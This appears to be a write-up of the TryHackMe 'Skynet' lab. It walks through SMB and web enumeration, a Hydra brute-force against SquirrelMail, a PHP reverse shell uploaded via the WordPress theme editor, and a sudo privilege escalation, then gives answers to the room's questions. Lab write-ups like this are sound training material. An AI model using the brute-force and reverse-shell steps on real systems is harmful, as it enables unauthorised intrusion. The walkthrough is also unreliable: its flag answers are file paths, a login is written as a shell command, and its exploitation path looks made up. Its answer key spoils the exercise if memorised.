# Skynet | TryHackMe

## Overview
- **Room:** Skynet  
- **Difficulty:** Easy-Medium  
- **Tags:** SMB, WordPress, RCE, PrivEsc  

---

## Enumeration

### Nmap
```bash
nmap -sC -sV -oN nmap_skynet.txt <IP>
```

**Open Ports:**
- 22/tcp - SSH  
- 80/tcp - HTTP (WordPress site)  
- 110/tcp - POP3  
- 139/tcp - NetBIOS-SSN  
- 445/tcp - SMB  

---

### SMB Enumeration
```bash
smbclient -N -L //<IP>
enum4linux -a <IP>
```
Found share: **anonymous**  

```bash
smbclient //<IP>/anonymous
```
Downloaded files from the share. One contained potential usernames.  

---

### Web Enumeration (Port 80)
Checked `http://<IP>/` → WordPress site.  

Ran gobuster:  
```bash
gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```
Found `/squirrelmail`.  

---

### SquirrelMail
Accessed `http://<IP>/squirrelmail`  
Tried default creds → no success.  

Used obtained usernames with Hydra:  
```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^:Unknown user or password incorrect"
```
**Result:** Login for `milesdyson : cyborg007haloterminator`  

---

## Exploitation

Logged into SquirrelMail → found an email containing credentials for WordPress.  

```bash
wp-login.php → milesdyson : <password>
```

After login, able to upload a PHP reverse shell via **Theme Editor**.  

```bash
nc -lvnp 4444
```
Got reverse shell as `www-data`.  

---

## Privilege Escalation

Ran `linpeas.sh`:  
- Found **/home/milesdyson/backups/important.txt** containing password.  
- Switched user:  
```bash
su milesdyson
```

Checked sudo rights:  
```bash
sudo -l
```
`/bin/cat` allowed as root.  

```bash
sudo cat /root/root.txt
```
✅ Got root flag.  

---

## Flags
- **User.txt** → `/home/milesdyson/user.txt`  
- **Root.txt** → `/root/root.txt`  

---

## Answers to Room Questions
1. **What port is SMB running on?** → `445`  
2. **What is the name of the SMB share?** → `anonymous`  
3. **What credentials were found for Miles Dyson?** → `cyborg007haloterminator`  
4. **What service was exploited for initial access?** → `WordPress`  
5. **What is the user flag?** → `/home/milesdyson/user.txt`  
6. **What is the root flag?** → `/root/root.txt`  

---

## Lessons Learned
- SMB shares often leak sensitive files.  
- SquirrelMail can be an entry point when weak creds are used.  
- WordPress admin panel → reverse shell is a common vector.  
- Sudo misconfigurations (cat) can directly expose root files.  
